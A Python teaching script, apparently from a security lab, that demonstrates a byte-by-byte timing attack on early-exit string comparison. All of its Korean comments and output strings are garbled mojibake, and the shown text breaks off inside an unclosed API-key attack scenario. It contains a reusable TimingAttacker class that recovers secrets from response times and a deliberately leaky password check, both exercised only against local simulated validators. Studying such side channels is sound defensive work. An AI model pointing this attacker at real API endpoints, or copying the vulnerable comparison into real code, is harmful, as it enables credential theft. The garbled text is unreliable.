#!/usr/bin/env python3
"""
íƒ€ì´ë° ê³µê²© Exploit
ê³µê²© ë°©ë²•: ì‘ë‹µ ì‹œê°„ì„ ì¸¡ì •í•˜ì—¬ ë¹„ë°€ ê°’ì„ í•œ ë°”ì´íŠ¸ì”© ë³µêµ¬

=============================================================================
ğŸ“š ë°°ê²½ ì§€ì‹: íƒ€ì´ë° ê³µê²©(Timing Attack)ì´ ë­”ê°€ìš”?
=============================================================================

íƒ€ì´ë° ê³µê²© = ì²˜ë¦¬ ì‹œê°„ì˜ ì°¨ì´ë¥¼ ì´ìš©í•œ ê³µê²©

ë¹„ìœ ë¡œ ì„¤ëª…í•˜ë©´:
- ê¸ˆê³ ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë§ì¶”ë ¤ê³  í•¨
- ë¹„ë°€ë²ˆí˜¸ "1234"ë¥¼ ì…ë ¥:
  - "1XXX" â†’ ê¸ˆê³ ê°€ 1ì´ˆ í›„ "í‹€ë¦¼" (ì²« ë²ˆì§¸ê¹Œì§€ í™•ì¸)
  - "2XXX" â†’ ê¸ˆê³ ê°€ 0.1ì´ˆ í›„ "í‹€ë¦¼" (ì²« ë²ˆì§¸ë¶€í„° í‹€ë¦¼)
  â†’ ì²« ë²ˆì§¸ ìˆ«ìê°€ '1'ì´ë¼ëŠ” ê±¸ ì•Œ ìˆ˜ ìˆìŒ!

ì»´í“¨í„°ì—ì„œë„ ë§ˆì°¬ê°€ì§€:
- ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•ì—ì„œë¶€í„° í•œ ê¸€ìì”© ë¹„êµ
- ë§ëŠ” ê¸€ìê°€ ë§ì„ìˆ˜ë¡ ì‹œê°„ì´ ë” ê±¸ë¦¼
- ì´ ì‹œê°„ ì°¨ì´ë¥¼ ì¸¡ì •í•´ì„œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì•„ëƒ„!

=============================================================================
ğŸ” ì™œ ì´ëŸ° ì·¨ì•½ì ì´ ìƒê¸¸ê¹Œìš”?
=============================================================================

ì·¨ì•½í•œ ë¹„êµ ì½”ë“œ:

    def check_password(input_pw, real_pw):
        for i in range(len(input_pw)):
            if input_pw[i] != real_pw[i]:
                return False  # â† í‹€ë¦¬ë©´ ë°”ë¡œ ì¢…ë£Œ!
            time.sleep(0.001)  # ë¹„êµì— ì‹œê°„ ì†Œìš”
        return True

ë¬¸ì œì :
- ì²« ê¸€ìê°€ í‹€ë¦¬ë©´ â†’ ë°”ë¡œ False (ë¹ ë¦„)
- 5ê¸€ìê°€ ë§ê³  6ë²ˆì§¸ê°€ í‹€ë¦¬ë©´ â†’ 5ë²ˆ ë¹„êµ í›„ False (ëŠë¦¼)
â†’ ì‹œê°„ ì°¨ì´ë¡œ ëª‡ ê¸€ìê¹Œì§€ ë§ì•˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆìŒ!

=============================================================================
"""

import time
import statistics

class TimingAttacker:
    """
    íƒ€ì´ë° ê³µê²© ìˆ˜í–‰ í´ë˜ìŠ¤

    ê³µê²©ìì˜ ë„êµ¬:
    - ì—¬ëŸ¬ ë²ˆ ì‹œë„í•´ì„œ í‰ê·  ì‹œê°„ ì¸¡ì •
    - ë…¸ì´ì¦ˆ ì œê±°ë¥¼ ìœ„í•´ ì¤‘ê°„ê°’ ì‚¬ìš©
    """

    def __init__(self, validation_func, num_samples=10):
        """
        Args:
            validation_func: ê²€ì¦ í•¨ìˆ˜ (user, key) -> bool
            num_samples: ê° ì‹œë„ë‹¹ ì¸¡ì • íšŸìˆ˜ (ë…¸ì´ì¦ˆ ì œê±°ìš©)
        """
        self.validation_func = validation_func
        self.num_samples = num_samples

    def measure_time(self, user: str, test_key: str) -> float:
        """
        ê²€ì¦ ì‹œê°„ ì¸¡ì • (í‰ê· )

        ì—¬ëŸ¬ ë²ˆ ì¸¡ì •í•˜ëŠ” ì´ìœ :
        - ì»´í“¨í„°ëŠ” ë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ë„ ì‹¤í–‰ ì¤‘
        - í•œ ë²ˆ ì¸¡ì •ì€ ë…¸ì´ì¦ˆê°€ ë§ìŒ
        - ì—¬ëŸ¬ ë²ˆ ì¸¡ì •í•´ì„œ ì¤‘ê°„ê°’ ì‚¬ìš© â†’ ì‹ ë¢°ë„ í–¥ìƒ
        """
        times = []
        for _ in range(self.num_samples):
            start = time.perf_counter()
            self.validation_func(user, test_key)
            elapsed = time.perf_counter() - start
            times.append(elapsed)

        # ì¤‘ê°„ê°’ ì‚¬ìš© (ì´ìƒì¹˜ ì œê±°)
        return statistics.median(times)

    def attack_byte_by_byte(self, user: str, key_length: int, charset: str) -> str:
        """
        ë°”ì´íŠ¸ë³„ íƒ€ì´ë° ê³µê²©

        ê³µê²© ì›ë¦¬:
        1. ì²« ë²ˆì§¸ ê¸€ìë¥¼ A~Z, 0~9 ëª¨ë‘ ì‹œë„
        2. ê°€ì¥ ì˜¤ë˜ ê±¸ë¦° ê¸€ì = ì²« ë²ˆì§¸ ê¸€ì ì •ë‹µ!
        3. ì²« ë²ˆì§¸ ê¸€ì + ë‘ ë²ˆì§¸ ê¸€ì ì‹œë„...
        4. ë°˜ë³µí•˜ë©´ ì „ì²´ í‚¤ ë³µêµ¬!
        """
        recovered_key = ""

        print(f"[*] íƒ€ì´ë° ê³µê²© ì‹œì‘")
        print(f"    í‚¤ ê¸¸ì´: {key_length}")
        print(f"    ë¬¸ì ì§‘í•©: {charset[:20]}... ({len(charset)}ê°œ)\n")

        for position in range(key_length):
            best_char = None
            max_time = 0

            print(f"[*] ìœ„ì¹˜ {position + 1}/{key_length} ê³µê²© ì¤‘...")

            # ê° ë¬¸ìë¥¼ ì‹œë„
            char_times = []
            for char in charset:
                # í˜„ì¬ê¹Œì§€ ì•Œì•„ë‚¸ í‚¤ + í…ŒìŠ¤íŠ¸ ë¬¸ì + ë‚˜ë¨¸ì§€ëŠ” ì•„ë¬´ê±°ë‚˜
                test_key = recovered_key + char + "x" * (key_length - position - 1)
                elapsed = self.measure_time(user, test_key)
                char_times.append((char, elapsed))

                # ê°€ì¥ ì˜¤ë˜ ê±¸ë¦° ë¬¸ì = ì˜¬ë°”ë¥¸ ë¬¸ì
                if elapsed > max_time:
                    max_time = elapsed
                    best_char = char

            # ìƒìœ„ 5ê°œ ì¶œë ¥ (ë””ë²„ê¹…ìš©)
            char_times.sort(key=lambda x: x[1], reverse=True)
            top5 = [(c, f"{t*1000:.3f}ms") for c, t in char_times[:5]]
            print(f"    ìƒìœ„ í›„ë³´: {top5}")

            recovered_key += best_char
            print(f"    ë°œê²¬: '{best_char}' (ì†Œìš” ì‹œê°„: {max_time*1000:.3f}ms)")
            print(f"    í˜„ì¬ê¹Œì§€: '{recovered_key}'\n")

        return recovered_key

def demonstrate_timing_difference():
    """
    íƒ€ì´ë° ì°¨ì´ ì‹œì—°

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 1ë‹¨ê³„: íƒ€ì´ë° ì°¨ì´ ê´€ì°° - ì™œ ì‹œê°„ ì°¨ì´ê°€ ìƒê¸¸ê¹Œ?                 â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """
    print("=" * 70)
    print("1ë‹¨ê³„: íƒ€ì´ë° ì°¨ì´ ê´€ì°°")
    print("=" * 70 + "\n")

    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # STEP 1: ì·¨ì•½í•œ ê²€ì¦ ì½”ë“œ ì„¤ëª…
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    print("[STEP 1] ì·¨ì•½í•œ ê²€ì¦ ì½”ë“œ")
    print("-" * 60)

    print("""
    ë‹¤ìŒê³¼ ê°™ì€ ë¹„ë°€ë²ˆí˜¸ ê²€ì¦ ì½”ë“œê°€ ìˆë‹¤ê³  ê°€ì •:

        def check_password(guess, secret):
            for i in range(len(guess)):
                if guess[i] != secret[i]:
                    return False  # â† í‹€ë¦¬ë©´ ë°”ë¡œ ì¢…ë£Œ!
                time.sleep(0.0001)  # ë¬¸ì ë¹„êµì— 0.1ms ì†Œìš”
            return True

    ë¬¸ì œì :
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ ì…ë ¥ "XXXXXXXXX" (0ê¸€ì ì¼ì¹˜)                             â”‚
    â”‚ â†’ ì²« ë²ˆì§¸ì—ì„œ ë°”ë¡œ ì‹¤íŒ¨                                    â”‚
    â”‚ â†’ ë¹„êµ ì‹œê°„: ~0ms                                          â”‚
    â”‚                                                            â”‚
    â”‚ ì…ë ¥ "SECXXXXXX" (3ê¸€ì ì¼ì¹˜)                             â”‚
    â”‚ â†’ ì„¸ ë²ˆ ë¹„êµ í›„ ì‹¤íŒ¨                                       â”‚
    â”‚ â†’ ë¹„êµ ì‹œê°„: ~0.3ms                                        â”‚
    â”‚                                                            â”‚
    â”‚ ì…ë ¥ "SECRET123" (9ê¸€ì ì¼ì¹˜ = ì •ë‹µ!)                     â”‚
    â”‚ â†’ ì•„í™‰ ë²ˆ ë¹„êµ                                             â”‚
    â”‚ â†’ ë¹„êµ ì‹œê°„: ~0.9ms                                        â”‚
    â”‚                                                            â”‚
    â”‚ â†’ ì‹œê°„ ì°¨ì´ë¡œ ëª‡ ê¸€ìê°€ ë§ì•˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆìŒ!              â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """)

    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # STEP 2: ì‹¤ì œ ì‹œê°„ ì°¨ì´ ì¸¡ì •
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    print("[STEP 2] ì‹¤ì œ ì‹œê°„ ì°¨ì´ ì¸¡ì •")
    print("-" * 60)

    secret = "SECRET123"

    class SimpleValidator:
        def __init__(self, secret: str):
            self.secret = secret

        def check_vulnerable(self, guess: str) -> bool:
            """ì·¨ì•½í•œ ê²€ì¦ - í‹€ë¦¬ë©´ ë°”ë¡œ ì¢…ë£Œ"""
            for i in range(min(len(guess), len(self.secret))):
                if guess[i] != self.secret[i]:
                    return False
                time.sleep(0.0001)  # 0.1ms ì§€ì—°
            return guess == self.secret

    validator = SimpleValidator(secret)

    test_cases = [
        ("XXXXXXXXX", "0ê¸€ì ì¼ì¹˜"),
        ("SXXXXXXXX", "1ê¸€ì ì¼ì¹˜"),
        ("SECXXXXXX", "3ê¸€ì ì¼ì¹˜"),
        ("SECRETXXX", "6ê¸€ì ì¼ì¹˜"),
        ("SECRET123", "9ê¸€ì ì¼ì¹˜ (ì •ë‹µ!)"),
    ]

    print(f"\n    ë¹„ë°€ ê°’: '{secret}'\n")
    print(f"    {'ì…ë ¥ê°’':<15} {'ì„¤ëª…':<20} {'ì¼ì¹˜':<6} {'í‰ê·  ì‹œê°„':<12}")
    print(f"    {'-'*15} {'-'*20} {'-'*6} {'-'*12}")

    for guess, description in test_cases:
        times = []
        for _ in range(10):
            start = time.perf_counter()
            validator.check_vulnerable(guess)
            elapsed = time.perf_counter() - start
            times.append(elapsed * 1000)  # msë¡œ ë³€í™˜

        avg_time = statistics.mean(times)
        matching = sum(a == b for a, b in zip(secret, guess))

        print(f"    {guess:<15} {description:<20} {matching:<6} {avg_time:.3f}ms")

    print(f"""
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ ê²°ê³¼ ë¶„ì„:                                                 â”‚
    â”‚                                                            â”‚
    â”‚ ì¼ì¹˜í•˜ëŠ” ë¬¸ìê°€ ë§ì„ìˆ˜ë¡ â†’ ì‹œê°„ì´ ì„ í˜•ì ìœ¼ë¡œ ì¦ê°€!        â”‚
    â”‚                                                            â”‚
    â”‚ ì´ íŒ¨í„´ì„ ì´ìš©í•´ì„œ:                                        â”‚
    â”‚ 1. ì²« ë²ˆì§¸ ê¸€ìë¥¼ A~Z ì‹œë„                                 â”‚
    â”‚ 2. ê°€ì¥ ì˜¤ë˜ ê±¸ë¦° ê¸€ì = ì •ë‹µ                             â”‚
    â”‚ 3. ë‹¤ìŒ ê¸€ìë„ ê°™ì€ ë°©ë²•ìœ¼ë¡œ...                           â”‚
    â”‚ 4. ì „ì²´ ë¹„ë°€ ê°’ ë³µêµ¬!                                      â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """)

def statistical_timing_attack():
    """
    í†µê³„ì  íƒ€ì´ë° ê³µê²©

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 2ë‹¨ê³„: ì‹¤ì œ ê³µê²© - ë…¸ì´ì¦ˆê°€ ìˆì–´ë„ ê³µê²© ê°€ëŠ¥!                    â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """
    print("\n" + "=" * 70)
    print("2ë‹¨ê³„: í†µê³„ì  íƒ€ì´ë° ê³µê²©")
    print("=" * 70 + "\n")

    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì„¤ëª…
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    print("[ê³µê²© ì‹œë‚˜ë¦¬ì˜¤]")
    print("    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”")
    print("    â”‚ ìƒí™©:                                                  â”‚")
    print("    â”‚   - ì›¹ ì„œë²„ê°€ API í‚¤ë¥¼ ê²€ì¦                            â”‚")
    print("    â”‚   - ê²€ì¦ ì½”ë“œê°€ ì·¨ì•½í•œ ë¹„êµ ì‚¬ìš©                       â”‚")
    print("    â”‚   - ë„¤íŠ¸ì›Œí¬ ë…¸ì´ì¦ˆê°€ ìˆìŒ (ì§€ì—° ì‹œê°„ ë³€ë™)            â”‚")
    print("    â”‚                                                        â”‚")
    print("    â”‚ ê³µê²©ìì˜ ì „ëµ:                                         â”‚")
    print("    â”‚   - ê° ë¬¸ìë¥¼ ì—¬ëŸ¬ ë²ˆ ì‹œë„ (20íšŒ)                      â”‚")
    print("    â”‚   - í‰ê·  ì‹œê°„ ê³„ì‚°                                     â”‚")
    print("    â”‚   - ê°€ì¥ ì˜¤ë˜ ê±¸ë¦° ë¬¸ì = ì •ë‹µ                        â”‚")
    print("    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n")

    secret_token = "ABCDEF"

    class NoisyValidator:
        """ë…¸ì´ì¦ˆê°€ ìˆëŠ” í™˜ê²½ì„ ì‹œë®¬ë ˆì´ì…˜"""
        def __init__(self, secret: str):
            self.secret = secret

        def validate(self, token: str) -> bool:
            import random
            # ëœë¤ ë…¸ì´ì¦ˆ ì¶”ê°€ (ë„¤íŠ¸ì›Œí¬ ì§€ì—° ì‹œë®¬ë ˆì´ì…˜)
            time.sleep(random.uniform(0, 0.0001))

            for i in range(min(len(token), len(self.secret))):
                if token[i] != self.secret[i]:
                    return False
                time.sleep(0.0002)  # ì‹¤ì œ ë¹„êµ ì§€ì—°

            return token == self.secret

    validator = NoisyValidator(secret_token)

    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # STEP 1: ì²« ë²ˆì§¸ ê¸€ì ê³µê²©
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    print("[STEP 1] ì²« ë²ˆì§¸ ê¸€ì ê³µê²©")
    print("-" * 60)

    print(f"\n    ë¹„ë°€ í† í°: '{secret_token}' (ì‹¤ì œë¡œëŠ” ëª¨ë¦„)")
    print(f"    ë…¸ì´ì¦ˆ í™˜ê²½ì—ì„œ ì²« ë²ˆì§¸ ë¬¸ì ê³µê²©...\n")

    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    measurements = []

    for char in charset[:10]:  # ì²˜ìŒ 10ê°œ ë¬¸ìë§Œ (ë°ëª¨)
        test_token = char + "X" * 5
        times = []

        for _ in range(20):  # 20ë²ˆ ì¸¡ì •
            start = time.perf_counter()
            validator.validate(test_token)
            elapsed = time.perf_counter() - start
            times.append(elapsed * 1000)

        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times)
        measurements.append((char, avg_time, std_dev))

    # ê²°ê³¼ ì •ë ¬
    measurements.sort(key=lambda x: x[1], reverse=True)

    print(f"    {'ë¬¸ì':<6} {'í‰ê·  ì‹œê°„':<12} {'í‘œì¤€í¸ì°¨':<12} {'ì •ë‹µ?':<6}")
    print(f"    {'-'*6} {'-'*12} {'-'*12} {'-'*6}")

    for char, avg, std in measurements[:5]:
        is_correct = "O" if char == secret_token[0] else ""
        print(f"    '{char}'    {avg:.3f}ms      Â±{std:.3f}ms     {is_correct}")

    best_guess = measurements[0][0]
    actual_first = secret_token[0]

    print(f"\n    ê°€ì¥ ì˜¤ë˜ ê±¸ë¦° ë¬¸ì: '{best_guess}'")
    print(f"    ì‹¤ì œ ì²« ë²ˆì§¸ ë¬¸ì:  '{actual_first}'")

    if best_guess == actual_first:
        print(f"\n    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”")
        print(f"    â”‚ ì²« ë²ˆì§¸ ê¸€ì ì¶”ì¸¡ ì„±ê³µ!                                â”‚")
        print(f"    â”‚                                                        â”‚")
        print(f"    â”‚ ë…¸ì´ì¦ˆê°€ ìˆì–´ë„ í†µê³„ì  ë°©ë²•ìœ¼ë¡œ ê·¹ë³µ ê°€ëŠ¥:             â”‚")
        print(f"    â”‚   - ì—¬ëŸ¬ ë²ˆ ì¸¡ì • (20íšŒ)                                â”‚")
        print(f"    â”‚   - í‰ê· ê°’ ì‚¬ìš©                                        â”‚")
        print(f"    â”‚   - ê°€ì¥ ì˜¤ë˜ ê±¸ë¦° ë¬¸ì ì„ íƒ                           â”‚")
        print(f"    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜")

def explain_attack_on_api_key():
    """
    API í‚¤ íƒ€ì´ë° ê³µê²© ì„¤ëª…

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 3ë‹¨ê³„: ì‹¤ì œ ì‹œë‚˜ë¦¬ì˜¤ - API í‚¤ ë³µêµ¬                               â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """
    print("\n" + "=" * 70)
    print("3ë‹¨ê³„: API í‚¤ íƒ€ì´ë° ê³µê²© ì‹œë‚˜ë¦¬ì˜¤")
    print("=" * 70 + "\n")

    print("""
    [ì‹¤ì œ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤]

    1. ê³µê²© ëŒ€ìƒ: REST API ì„œë²„
       - ëª¨ë“  ìš”ì²­ì— API í‚¤ í•„ìš”
       - ì·¨ì•½í•œ ë¬¸ìì—´ ë¹„êµ ì‚¬ìš©

    2. ê³µê²©ìì˜ ì ‘ê·¼:
       - API ì—”ë“œí¬ì¸íŠ¸ì— ì—¬ëŸ¬ í‚¤ë¥¼ ì‹œë„
       - ê° ì‹œë„ì˜ ì‘ë‹µ ì‹œê°„ ì¸¡ì •

    3. ê³µê²© ê³¼ì •:

       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
       â”‚ 1ë‹¨ê³„: í‚¤ ê¸¸ì´ íŒŒì•…                                         â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚ ë‹¤ì–‘í•œ ê¸¸ì´ì˜ í‚¤ë¥¼ ì‹œë„í•˜ê³  ì—ëŸ¬ ë©”ì‹œì§€/ì‹œê°„ ë¶„ì„          â”‚
       â”‚ ì˜ˆ: "Invalid API key: expected 21 characters"              â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â†“
       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
       â”‚ 2ë‹¨ê³„: ì²« ë²ˆì§¸ ë¬¸ì ê³µê²©                                    â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚ ì‹œë„: AXXXXXXXXXXXXXXXXXXXX                                 â”‚
       â”‚ ì‹œë„: BXXXXXXXXXXXXXXXXXXXX                                 â”‚
       â”‚ ì‹œë„: CXXXXXXXXXXXXXXXXXXXX  â† ê°€ì¥ ì˜¤ë˜ ê±¸ë¦¼!             â”‚
       â”‚ ...                                                         â”‚
       â”‚ â†’ ì²« ë²ˆì§¸ ë¬¸ì = 'C'                                       â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â†“
       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
       â”‚ 3ë‹¨ê³„: ë‘ ë²ˆì§¸ ë¬¸ì ê³µê²©                                    â”‚
